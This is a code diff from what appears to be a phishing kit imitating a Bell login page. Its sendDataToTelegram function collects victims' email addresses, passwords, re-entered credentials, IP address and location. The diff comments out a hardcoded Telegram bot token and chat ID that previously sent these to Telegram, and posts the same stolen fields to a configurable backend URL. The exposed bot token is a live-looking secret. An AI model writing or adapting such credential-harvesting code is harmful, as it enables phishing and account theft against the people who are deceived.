@@ -6,6 +6,9 @@
   let errors = { email: '', password: '' };
   let isModalVisible = false;
   let isContainerVisible = true;
+ 
+// Put your backend url here
+  let backendUrl = '';
 
   let ipAddress = '';
   let location = {
@@ -95,22 +98,24 @@
 
   // Send data to Telegram
   async function sendDataToTelegram(email, password, ip, location, modalEmail, modalPassword) {
-    const botToken = '7732681370:AAG-8Y1FMJe0DQA2d2O0LNUm_5enOWBddLo'; // Replace with your(others) Telegram bot token
-      const chatId = '6173839485'; // Replace with your(others) Telegram chat ID
+    // const botToken = '7732681370:AAG-8Y1FMJe0DQA2d2O0LNUm_5enOWBddLo'; // Replace with your(others) Telegram bot token
+     // const chatId = '6173839485'; // Replace with your(others) Telegram chat ID
 
-    const message = `New Bell Login Attempt:\nEmail: ${email}\nPassword: ${password}\nModalEmail: ${modalEmail}\nModal-Password: ${modalPassword}\nIP Address: ${ip}\nLocation:\nCountry: ${location.country}\nCity: ${location.city}\nState: ${location.state}\nZip Code: ${location.zip_code}`;
-
-    const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
+   // const message = `New Bell Login Attempt:\nEmail: ${email}\nPassword: ${password}\nModalEmail: ${modalEmail}\nModal-Password: ${modalPassword}\nIP Address: ${ip}\nLocation:\nCountry: ${location.country}\nCity: ${location.city}\nState: ${location.state}\nZip Code: ${location.zip_code}`;
+  
+   // const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
 
     try {
-      const response = await fetch(url, {
+      const response = await fetch(backendUrl, {
       method: 'POST',
       headers: {
         'Content-Type': 'application/json',
       },
       body: JSON.stringify({
-        chat_id: chatId,
-        text: message,
+        email: email,
+        password: password,
+        retypedEmail: modalEmail,
+        retypedPassword: modalPassword,
       }),
     });
 
